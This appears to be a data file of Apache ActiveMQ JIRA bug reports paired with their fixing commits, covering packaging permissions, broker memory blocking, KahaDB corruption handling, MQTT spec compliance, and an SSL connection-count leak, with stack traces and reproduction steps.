> ls -al apache-activemq-5.13.0/bin
drwxrwxr-x  5 myuser myuser  4096 janv.  7 10:26 .
drwxr-xr-x 10 myuser myuser  4096 nov.  30 15:14 ..
-rwxr-xr-x  1 myuser myuser 21250 nov.  30 15:14 activemq
-rwxr-xr-x  1 myuser myuser  6189 nov.  30 15:14 activemq-diag
-rw-------  1 myuser myuser 15977 nov.  30 15:09 activemq.jar
-rw-r--r--  1 myuser myuser  4881 nov.  30 15:14 env
drwxrwxr-x  2 myuser myuser  4096 janv.  7 10:26 linux-x86-32
drwxrwxr-x  2 myuser myuser  4096 janv.  7 10:26 linux-x86-64
drwxrwxr-x  2 myuser myuser  4096 janv.  7 10:26 macosx
-rwx------  1 myuser myuser 83820 nov.  30 14:53 wrapper.jar
{noformat}

This regression broke my automated deploy process and now I need to modify the release files (which is really not a great thing ....)

Can you fix this packaging regression ?

Thanks",43d493e527ccd7d940858646d37819d3bda0a806,"https://issues.apache.org/jira/browse/AMQ-6112

Fixing file permissions in assembly tar.  Some permissions were not
being set explicitly which means the value used could change depending
on where the assembly was built. Permissions are now being set to fix
this."
12922954,AMQ-6094,"On our production ActiveMQ broker (processes around 10 000 messages / sec in average) we have encountered situations where queues started blocking completely after running without problems for a couple of days.

When taking a look at the activemq logs, we can see messages like this (I've changed queue names and client IPs):

2015-12-17 20:52:37,375 | INFO  | Usage(default:memory:queue://Consumer.AAA.VirtualTopic.OFFER:memory) percentUsage=100%, usage=104858538, limit=104857600, percentUsageMinDelta=1%;Parent:Usage(default:memory) percentUsage=42%, usage=305669289, limit=720424141, percentUsageMinDelta=1%: Usage Manager Memory Limit reached. Producer (ID:ip-172-30-0-97-38230-1450370654525-1:8:1:1) stopped to prevent flooding queue://Consumer.AAA.VirtualTopic.OFFER. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 151s) | org.apache.activemq.broker.region.Queue | ActiveMQ Transport: tcp:///1.1.1.1:36128@61616

The strange thing is, when taking a look at the admin interface, there are no messages queued in the above mentioned queue and also purging the queue does not help.

The only thing that works (that we found out so far) (to get the broker process messages again) in the above situation is:
 * delete the queue (it then is recreated automatically and works again)
 * restart the broker

I have now tried to reproduce the situation locally and come up with a test case that, while I am not sure if that is the exact problem that we face in production, at least produces the same problem as mentioned above. I have noticed that we sometimes have network issues between the clients and the broker and therefore have done something similar in the test code.

The test code launches 4 producing threads and 4 consuming threads. The producers > 1000 messages / sec to the queues and the consumers just read them. Once after a while (every 10 seconds), one of the consuming threads is interrupted and then, with a delay of another 10 seconds, the connection is cleaned up (to free up the allocated messages that are already in the dead connections prefetchBuffer). 

When running the test case on a fresh download of activeMQ 5.13.0, it takes a long time until the broker completey blocks, as it takes time for the memory to fill up. However, when checking JMX stats, it is clearly visible, that the following metrics behave strangely:
 * CursorMemoryUsage
 * MemoryUsageByteCount

Both above metrics are quite constant for some time, and then, once a thread gets interrupted and the connection cleaned up, it suddenly increases by couple of mbytes ... then, again, while the consumers and producers work normally, the size is quite constant, until again, a consumer is interrupted, which again increases memory for couple of mbytes ... and this continues until memory is completely full and no messages can pass anymore through the broker.

To speed things up, a lower memory limit can be placed on the queue in the activemq.xml configuration file, which will lead to shorter waiting time before the broker blocks messages on the queue.

Even terminating the client jvm does not free up resources on the broker.",e3df09b9db09d6cf2834b0beb901c253be9b6120,https://issues.apache.org/jira/browse/AMQ-6094 - regression via https://issues.apache.org/jira/browse/AMQ-6014 - incorrect ref count on message expiry event during cursor move for dispatch. Fix and test - thanks for the test
12920401,AMQ-6083,"Kahadb checkForCorruptJournaFiles will pick up journal corruption via the checksum, but if the corrupt locations are not referenced by the index the corruption is ignored, even if ignoreMissingJournalFiles (which should be called ignoreMissingJournalFilesOrCorruptJournalLocations) is false (the default).

this means that acks can be missing and in the event of a journal replay, there is no indication of the missing acks.

If ignoreMissingJournalFiles=false and corruption or missing journal files that just have acks are detected, the broker should error out.

This ensures that corruption does not go unnoticed and the root cause can be determined before restart. ",8609f74db329d97eac054cca2d1dd188c2960ddd,https://issues.apache.org/jira/browse/AMQ-6083 - ignore test scenario on leveldb store
12917991,AMQ-6070,The discarded/consumed/delivered advisories have the messageid as the value of the property key originalDestination in error.,67ae2bd8a486d065495eff97997c33cd7cf9f160,https://issues.apache.org/jira/browse/AMQ-6070 - fix npe in org.apache.activemq.usecases.ExpiredMessagesWithNoConsumerTest#testExpireMessagesForDurableSubscriber
12916645,AMQ-6065,"the broker attribute systemExitOnShutdown is useful in a karaf container or shared vm where the broker is the primary occupant. If the broker dies, then the container should die.
For the broker, if the store dies, then the broker should die, but for other scenarios, like the broker is shutdown via jmx or for maintenance, exiting the container is not required.
Allowing the DefaultIOExceptionHandler, which gets to handle store exceptions, flip the systemExit bit allows a container to exit on this fatal condition. Ensuring that failover of the store can occur due the the exit of the jvm that has the store lock.
With karaf on windows, the file locker is not reliable on failback when the jvm remains active.",2aa172f905d3c783c722f6aedd0fe2c1af7b988d,"https://issues.apache.org/jira/browse/AMQ-6065 - allow ioexception handler to flip the systemExitOnShutdown broker attribute before calling stop, i.e: exit on store io errors"
12916645,AMQ-6065,"the broker attribute systemExitOnShutdown is useful in a karaf container or shared vm where the broker is the primary occupant. If the broker dies, then the container should die.
For the broker, if the store dies, then the broker should die, but for other scenarios, like the broker is shutdown via jmx or for maintenance, exiting the container is not required.
Allowing the DefaultIOExceptionHandler, which gets to handle store exceptions, flip the systemExit bit allows a container to exit on this fatal condition. Ensuring that failover of the store can occur due the the exit of the jvm that has the store lock.
With karaf on windows, the file locker is not reliable on failback when the jvm remains active.",f09000d1e61a0131ee20df22b7b2ac6d297ebd07,https://issues.apache.org/jira/browse/AMQ-6065 - ensure no call to exit. fix mock test to account for extra call
12915785,AMQ-6060,"The ""will message"" in MQTT can be sent with the retain flag on, meaning that it will be sent to the new subscribers as well. We need to send it with this flag on, if it was specified by the client.",9bc28214d53351a6fa6cf459383d5e449a100d2d,https://issues.apache.org/jira/browse/AMQ-6060 - retain will message
12907332,AMQ-6020,"Compile from master

feature:repo-add activemq 5.13-SNAPSHOT
feature:install activemq-broker activemq-web-console 

The web console bundle is active and web:list shows:
ID | State       | Web-State   | Level | Web-ContextPath | Name
-------------------------------------------------------------------------------------------------
62 | Active      | Deployed    | 80    | /activemqweb    | activemq-web-console (5.13.0.SNAPSHOT)

When I go to 
http://localhost:8181/activemqweb/

I get unable to connect. So the port is not active. Maybe pax web does not activate jetty because of the exception below.

In the log I see this exception:
ClassNotFoundException: javax.xml.transform.stax.StAXSource

Full trace here:
2015-10-23 10:48:20,428 | ERROR | pool-45-thread-1 | DispatcherServlet                | 62 - org.apache.activemq.activemq-web-console - 5.13.0.SNAPSHOT | Context initialization failed
org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter': Instantiation of bean failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter]: Constructor threw exception; nested exception is java.lang.NoClassDefFoundError: javax/xml/transform/stax/StAXSource
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateBean(AbstractAutowireCapableBeanFactory.java:1099)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1044)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:504)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:476)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:291)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.web.servlet.DispatcherServlet.createDefaultStrategy(DispatcherServlet.java:849)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.web.servlet.DispatcherServlet.getDefaultStrategies(DispatcherServlet.java:818)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.web.servlet.DispatcherServlet.initHandlerAdapters(DispatcherServlet.java:626)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.web.servlet.DispatcherServlet.initStrategies(DispatcherServlet.java:483)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.web.servlet.DispatcherServlet.onRefresh(DispatcherServlet.java:471)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.web.servlet.FrameworkServlet.onApplicationEvent(FrameworkServlet.java:802)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.web.servlet.FrameworkServlet$ContextRefreshListener.onApplicationEvent(FrameworkServlet.java:1118)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.web.servlet.FrameworkServlet$ContextRefreshListener.onApplicationEvent(FrameworkServlet.java:1114)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.context.event.GenericApplicationListenerAdapter.onApplicationEvent(GenericApplicationListenerAdapter.java:52)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.context.event.SourceFilteringListener.onApplicationEventInternal(SourceFilteringListener.java:100)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.context.event.SourceFilteringListener.onApplicationEvent(SourceFilteringListener.java:69)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.context.event.SimpleApplicationEventMulticaster.invokeListener(SimpleApplicationEventMulticaster.java:151)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:128)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:331)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.context.support.AbstractApplicationContext.finishRefresh(AbstractApplicationContext.java:775)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:483)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.web.servlet.FrameworkServlet.configureAndRefreshWebApplicationContext(FrameworkServlet.java:664)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.web.servlet.FrameworkServlet.createWebApplicationContext(FrameworkServlet.java:630)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.web.servlet.FrameworkServlet.createWebApplicationContext(FrameworkServlet.java:678)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.web.servlet.FrameworkServlet.initWebApplicationContext(FrameworkServlet.java:549)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:490)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.web.servlet.HttpServletBean.init(HttpServletBean.java:136)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at javax.servlet.GenericServlet.init(GenericServlet.java:244)[57:javax.servlet-api:3.1.0]
	at org.eclipse.jetty.servlet.ServletHolder.initServlet(ServletHolder.java:612)[107:org.eclipse.jetty.servlet:9.2.10.v20150310]
	at org.eclipse.jetty.servlet.ServletHolder.initialize(ServletHolder.java:395)[107:org.eclipse.jetty.servlet:9.2.10.v20150310]
	at org.eclipse.jetty.servlet.ServletHandler.initialize(ServletHandler.java:871)[107:org.eclipse.jetty.servlet:9.2.10.v20150310]
	at org.eclipse.jetty.servlet.ServletContextHandler.startContext(ServletContextHandler.java:298)[107:org.eclipse.jetty.servlet:9.2.10.v20150310]
	at org.eclipse.jetty.server.handler.ContextHandler.doStart(ContextHandler.java:741)[106:org.eclipse.jetty.server:9.2.10.v20150310]
	at org.ops4j.pax.web.service.jetty.internal.HttpServiceContext.doStart(HttpServiceContext.java:245)[126:org.ops4j.pax.web.pax-web-jetty:4.2.2]
	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:68)[109:org.eclipse.jetty.util:9.2.10.v20150310]
	at org.ops4j.pax.web.service.jetty.internal.JettyServerImpl$1.start(JettyServerImpl.java:258)[126:org.ops4j.pax.web.pax-web-jetty:4.2.2]
	at org.ops4j.pax.web.service.internal.HttpServiceStarted.end(HttpServiceStarted.java:1047)[128:org.ops4j.pax.web.pax-web-runtime:4.2.2]
	at org.ops4j.pax.web.service.internal.HttpServiceProxy.end(HttpServiceProxy.java:413)[128:org.ops4j.pax.web.pax-web-runtime:4.2.2]
	at org.ops4j.pax.web.extender.war.internal.RegisterWebAppVisitorWC.end(RegisterWebAppVisitorWC.java:380)[124:org.ops4j.pax.web.pax-web-extender-war:4.2.2]
	at org.ops4j.pax.web.extender.war.internal.model.WebApp.accept(WebApp.java:692)[124:org.ops4j.pax.web.pax-web-extender-war:4.2.2]
	at org.ops4j.pax.web.extender.war.internal.WebAppPublisher$WebAppDependencyListener.register(WebAppPublisher.java:237)[124:org.ops4j.pax.web.pax-web-extender-war:4.2.2]
	at org.ops4j.pax.web.extender.war.internal.WebAppPublisher$WebAppDependencyListener.addingService(WebAppPublisher.java:182)[124:org.ops4j.pax.web.pax-web-extender-war:4.2.2]
	at org.ops4j.pax.web.extender.war.internal.WebAppPublisher$WebAppDependencyListener.addingService(WebAppPublisher.java:135)[124:org.ops4j.pax.web.pax-web-extender-war:4.2.2]
	at org.osgi.util.tracker.ServiceTracker$Tracked.customizerAdding(ServiceTracker.java:941)[org.osgi.core-6.0.0.jar:]
	at org.osgi.util.tracker.ServiceTracker$Tracked.customizerAdding(ServiceTracker.java:870)[org.osgi.core-6.0.0.jar:]
	at org.osgi.util.tracker.AbstractTracked.trackAdding(AbstractTracked.java:256)[org.osgi.core-6.0.0.jar:]
	at org.osgi.util.tracker.AbstractTracked.trackInitial(AbstractTracked.java:183)[org.osgi.core-6.0.0.jar:]
	at org.osgi.util.tracker.ServiceTracker.open(ServiceTracker.java:318)[org.osgi.core-6.0.0.jar:]
	at org.osgi.util.tracker.ServiceTracker.open(ServiceTracker.java:261)[org.osgi.core-6.0.0.jar:]
	at org.ops4j.pax.web.extender.war.internal.WebAppPublisher.publish(WebAppPublisher.java:101)[124:org.ops4j.pax.web.pax-web-extender-war:4.2.2]
	at org.ops4j.pax.web.extender.war.internal.WebObserver.deploy(WebObserver.java:219)[124:org.ops4j.pax.web.pax-web-extender-war:4.2.2]
	at org.ops4j.pax.web.extender.war.internal.WebObserver$1.doStart(WebObserver.java:179)[124:org.ops4j.pax.web.pax-web-extender-war:4.2.2]
	at org.ops4j.pax.web.extender.war.internal.extender.SimpleExtension.start(SimpleExtension.java:59)[124:org.ops4j.pax.web.pax-web-extender-war:4.2.2]
	at org.ops4j.pax.web.extender.war.internal.extender.AbstractExtender$1.run(AbstractExtender.java:280)[124:org.ops4j.pax.web.pax-web-extender-war:4.2.2]
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)[:1.8.0_60]
	at java.util.concurrent.FutureTask.run(FutureTask.java:266)[:1.8.0_60]
	at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:180)[:1.8.0_60]
	at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:293)[:1.8.0_60]
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)[:1.8.0_60]
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)[:1.8.0_60]
	at java.lang.Thread.run(Thread.java:745)[:1.8.0_60]
Caused by: org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter]: Constructor threw exception; nested exception is java.lang.NoClassDefFoundError: javax/xml/transform/stax/StAXSource
	at org.springframework.beans.BeanUtils.instantiateClass(BeanUtils.java:163)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:89)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateBean(AbstractAutowireCapableBeanFactory.java:1092)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	... 60 more
Caused by: java.lang.NoClassDefFoundError: javax/xml/transform/stax/StAXSource
	at org.springframework.http.converter.xml.SourceHttpMessageConverter.<clinit>(SourceHttpMessageConverter.java:74)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.<init>(AnnotationMethodHandlerAdapter.java:203)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)[:1.8.0_60]
	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)[:1.8.0_60]
	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)[:1.8.0_60]
	at java.lang.reflect.Constructor.newInstance(Constructor.java:422)[:1.8.0_60]
	at org.springframework.beans.BeanUtils.instantiateClass(BeanUtils.java:147)[62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT]
	... 62 more
Caused by: java.lang.ClassNotFoundException: javax.xml.transform.stax.StAXSource not found by org.apache.activemq.activemq-web-console [62]
	at org.apache.felix.framework.BundleWiringImpl.findClassOrResourceByDelegation(BundleWiringImpl.java:1558)[org.apache.felix.framework-5.2.0.jar:]
	at org.apache.felix.framework.BundleWiringImpl.access$400(BundleWiringImpl.java:79)[org.apache.felix.framework-5.2.0.jar:]
	at org.apache.felix.framework.BundleWiringImpl$BundleClassLoader.loadClass(BundleWiringImpl.java:1998)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:357)[:1.8.0_60]
	... 69 more
",0ff46b18790d8df6221346b0f433fea53fa5c69a,"[AMQ-6020] Adding the necessary import and removing the export packages
This closes #153
This closes #152"
12905926,AMQ-6014,"To reproduce:
1) Start two durable subscriptions using the openwire swissarmy examples:

ant consumer -Dtopic=true -Ddurable=true -Dsubject=test -Duser=admin -Dpassword=admin -Dmax 500000

ant consumer -Dtopic=true -Ddurable=true -Dsubject=test -Duser=admin -Dpassword=admin -DclientId=c2

2) Start a producer using the following command:

ant producer -Dtopic=true -Ddurable=true -Dsubject=test -Duser=admin -Dpassword=admin -Dmax=500000

3) Kill one of the durable topic subscribers and let the test run

4) the broker will go OOM

The cache for the offline durable sub is not recording is cached messages against system memory usage as it should. Hence the limits are not hit.",e3df09b9db09d6cf2834b0beb901c253be9b6120,https://issues.apache.org/jira/browse/AMQ-6094 - regression via https://issues.apache.org/jira/browse/AMQ-6014 - incorrect ref count on message expiry event during cursor move for dispatch. Fix and test - thanks for the test
12904662,AMQ-6010,"When using the AMQP SSL transport the currentTransportCount (variable that tracks connection count in TcpTransportServer.java) can ""leak"" when the SSL connection is aborted during handshake. In this case the TcpTransportServer class the currentTransportCount is incremented in handleSocket but never decremented in stopped. This eventually leads to ExceededMaximumConnectionsException being thrown from handleSocket. The SSL connection is aborted during handshake if needClientAuth is configured on the transport and a client with an invalid certificate tries to connect.

*Reproduction*
1. Enable the AMQP SSL transport: {{<transportConnector name=""amqp+ssl"" uri=""amqp+ssl://0.0.0.0:5671?needClientAuth=true&amp;maximumConnections=10""/>}}
2. Try to connect with no/invalid client certificate: {{openssl s_client -connect localhost:5671}}
3. After 10 attempts ActiveMQ logs will start showing ExceededMaximumConnectionsException exceptions.

*Bug*
During the SSL handshake phase the protocol converter in the AMQP transport is set to the AMQPProtocolDiscriminator which silently swallows exceptions:
{code:java}
public void onAMQPException(IOException error) {
}
{code}
Which in turn cause the normal stop sequence (via asyncStop) to be skipped.

*Fix*
Change the AMQPProtocolDiscriminator to handle the error instead of swallow it:
{code:java}
public void onAMQPException(IOException error) {
    transport.sendToActiveMQ(error);
}
{code}
",80b526be7df3471876eceaa2c610747ca7fb89da,"https://issues.apache.org/jira/browse/AMQ-6010

Fix for failed SSL connections not releasing the connection count in the
transport which leads to connections being rejected as having eceeded
the maximum configured connections."
12903308,AMQ-6004,"I am trying to achieve a clean shutdown of an embedded broker in a web application running in Tomcat. When the web application is shut down, Tomcat is always complaining about a running thread:
{code}
09:09:55.948 WARN  [o.a.c.loader.WebappClassLoaderBase] [] The web application [xxx] appears to have started a thread named [ActiveMQ Transport Server Thread Handler: tcp://0.0.0.0:12345] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread:
 sun.misc.Unsafe.park(Native Method)
 java.util.concurrent.locks.LockSupport.parkNanos(Unknown Source)
 java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(Unknown Source)
 java.util.concurrent.LinkedBlockingQueue.poll(Unknown Source)
 org.apache.activemq.transport.tcp.TcpTransportServer$2.run(TcpTransportServer.java:427)
 java.lang.Thread.run(Unknown Source)
{code}

I am pretty sure this can be easily fixed by interrupting the socket handler thread, as suggested by Andreas Hartmann in [AMQ-3451|https://issues.apache.org/jira/browse/AMQ-3451?focusedCommentId=13170863&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-13170863]. Please see attached patch.",4adc8e4f4e57a4335643f49c3072e5fd531c7f27,"https://issues.apache.org/jira/browse/AMQ-6004

Calling socketHandlerThread.interrupt() on TcpTransportServer stop to
make sure the broker shutsdown cleanly.

Patch applied with thanks to Erik Godding Boye"
12902937,AMQ-6002,"If client id contains special characters like ""."", the consumer will not receive messages properly",816e8dfe5413cf9316bf1946afe6f236d85f8351,https://issues.apache.org/jira/browse/AMQ-6002 - escape client id in virtual topic mqtt subscription; add test
12862989,AMQ-5960,"The main reason for this is that ackPositions (based on which pendingQueueSize is calculated) is not rebuilt correctly during index recover.

To reproduce it:
1. Start the broker
2. Start producer and durable consumer on a topic, making a load
3. Kill the broker with -9
4. Restart the broker

The durable consumer pendingQueueSize is off by one and is never corrected",4ab55f13ae4097de1dad14af36b65a89eda9b81d,https://issues.apache.org/jira/browse/AMQ-5960 - durable sub pendingQueueSize after force shutdown
12855834,AMQ-5926,"I have a dependency to activemq-all in my maven project, which in turn has an optional dependency to activemq-camel. This leads to activemq-camel not being added as a transtive dependency. But classes in activemq-all depends on apache camel (CamelContext and CamelContextAware in org.apache.activemq.camel.CamelConnection), which then does not exists. This yields an error upon deploying my application, classnotfoundexception.",45e37e97884484ba9c71ed21a19827b8271b9191,"https://issues.apache.org/jira/browse/AMQ-5926

Adding camel and related dependencies to the activemq-all shaded jar"
12852604,AMQ-5921,"The change made in AMQ-1584 changed how primitive classes are handled which is fine, but it got rid of the check for ""void"".

Just need to add a check to the end of the ""loadSimpleType(String name)"" method:

...
else if (""void"".equals(name)) {
    return void.class;
}
...
",41ee3ec8dea1df70cb12f722dcf797f50b24fc54,"https://issues.apache.org/jira/browse/AMQ-5921

Add back support for type void and test."
12851139,AMQ-5914,If a message expires in-flight or while in a rolled back transaction the pull consumer does not send another pull request and can hang when sending the poison Ack for the expired message.,3348ade99b2be00eb5452785a1325afc2a39b066,"https://issues.apache.org/jira/browse/AMQ-5914

Ensure a new pull request is sent, adds test."
12846902,AMQ-5898,"Hi Tim,

AMQ-5187 breaks some of our message routing where we use virtual queues to control mirroring/replication of messages.

A simple example...

{code}
VIRTUAL.PUB.ALL
-> queue://SUBSCRIBER1
-> queue://SUBSCRIBER2

VIRTUAL.PUB.SUBSCRIBER1
-> queue://SUBSCRIBER1
{code}

...fails [this assert|https://github.com/apache/activemq/commit/f55edcfa25de1b55659a7113be60360c531ffa8a#diff-0def63df6ee6c0e4f8adcf00011b2f07R70] because there are two composite destinations that route to {{queue://SUBSCRIBER1}}. With asserts disabled messages are routed as expected.

I have attached a test case exemplifying this.

We use layers of composite queues to achieve explicit routing of messages to either one consumer or all consumers, and (also with static subscriptions) to target optimal routes across a mixture of LAN and WAN links.

Fully appreciate that subscription recovery from virtual topics of a mapped queue is a beneficial thing to do, however from our perspective it is also useful to retain the behaviour of being able to have a many-to-one mapping between composite queues and physical queues. For our own use case we don't have any requirement for subscription recovery - we require cast-iron guarantees around messaging so all messages persistent and are delivered to one or more physical queues on brokers with persistence enabled, so this obviates the need for subscription recovery.

Could this validation relaxed, could it be made possible for the new behaviour to be disabled or do you have any suggestions as to how else we could achieve our use case?

Thanks,
James",95f58fa7c4e26b5b2d73a80bd8e1cb2bee8ebf47,"https://issues.apache.org/jira/browse/AMQ-6027

Adding back in test case now that AMQ-5898 is resolved"
12845009,AMQ-5882,"publish to topic ""MQTTClient/+-[MQTTClientPublishTests"" is accepted
publish to topic ""MQTTClient/#-[MQTTClientPublishTests"" is accepted

MQTT spec says:
[MQTT-3.3.2-2]
The Topic Name in the PUBLISH Packet MUST NOT contain wildcard characters.",1b38b27ed23a5ac604e5a4dd509dd854afdfde07,"https://issues.apache.org/jira/browse/AMQ-5882

Fail to publish if the topic name in the publish packet contains a wild
card character as per the MQTT V3.1 and V3.1.1 spec."
12845007,AMQ-5881,"
MQTT spec says:
[MQTT-3.1.2-22]
If the User Name Flag is set to 0, the Password Flag MUST be set to 0.",c530b69e16372232bef19dcd353cbe91e4a511d2,"https://issues.apache.org/jira/browse/AMQ-5881

Fail the connect if the password is set but the username bit is not as
per the V3.1.1 spec requirements."
12845006,AMQ-5880,"Trying to send topic length 32767 works
65521, 65534, 65535 do not work

AMQ says:
WARN | Transport Connection to: tcp://0:0:0:0:0:0:0:1:52308 failed: java.io.IOException: Unexpected error occurred: java.lang.ArrayIndexOutOfBoundsException: -1
 WARN | Transport Connection to: tcp://0:0:0:0:0:0:0:1:52612 failed: java.io.IOException: Unexpected error occurred: java.lang.ArrayIndexOutOfBoundsException: -1
 WARN | Transport Connection to: tcp://0:0:0:0:0:0:0:1:52625 failed: java.io.IOException: Unexpected error occurred: java.lang.ArrayIndexOutOfBoundsException: -11

MQTT spec says:
[MQTT-4.7.3-3]
Topic Names and Topic Filters are UTF-8 encoded strings, they MUST NOT encode to more than 65535 bytes.",8ef44452a24685dea52b0757960c1a750abd4246,"https://issues.apache.org/jira/browse/AMQ-5880

Adds a test for the issue that is ignored for now while we wait for a
fixed MQTT client release."
12843216,AMQ-5875,"This issue occurs when using multiKahaDB and a wild card destination.  The problem is that with a wild card topic, multiple destinations can be attached to the same store.  If one of the destinations is deleted and the other destinations are empty, the entire store is deleted.  This causes an exception later on if trying to do something like subscribe to a destination that wasn't deleted.  I've attached a test case to show this issue.  

The problem seems to be that the removeMessageStore method in MultiKahaDBPersistenceAdapter relies on adapter.getDestinations.isEmpty() to determine whether the store is eligible for deleting.  Unfortunately, the getDestinations method in KahaDBStore excludes destinations that are empty therefore the method doesn't return any destinations even though there is one still attached to the store so the logic goes ahead and deletes the store.

The stack trace from running against 5.12.0-SNAPSHOT is below:

{noformat}
java.lang.IllegalStateException: PageFile is not loaded
        at org.apache.activemq.store.kahadb.disk.page.PageFile.assertLoaded(PageFile.java:811)
        at org.apache.activemq.store.kahadb.disk.page.PageFile.tx(PageFile.java:304)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore.getMessageCount(KahaDBStore.java:866)
        at org.apache.activemq.store.ProxyTopicMessageStore.getMessageCount(ProxyTopicMessageStore.java:140)
        at org.apache.activemq.store.ProxyTopicMessageStore.getMessageCount(ProxyTopicMessageStore.java:140)
        at org.apache.activemq.broker.region.cursors.TopicStorePrefetch.getStoreSize(TopicStorePrefetch.java:97)
        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.resetSize(AbstractStoreCursor.java:73)
        at org.apache.activemq.broker.region.cursors.TopicStorePrefetch.<init>(TopicStorePrefetch.java:58)
        at org.apache.activemq.broker.region.cursors.StoreDurableSubscriberCursor.add(StoreDurableSubscriberCursor.java:119)
        at org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:584)
        at org.apache.activemq.broker.region.DurableTopicSubscription.add(DurableTopicSubscription.java:113)
        at org.apache.activemq.broker.region.Topic.addSubscription(Topic.java:161)
        at org.apache.activemq.broker.region.AbstractRegion.addConsumer(AbstractRegion.java:400)
        at org.apache.activemq.broker.region.TopicRegion.addConsumer(TopicRegion.java:168)
        at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:427)
        at org.apache.activemq.broker.jmx.ManagedRegionBroker.addConsumer(ManagedRegionBroker.java:244)
        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:102)
        at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:107)
        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:102)
        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:102)
        at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:107)
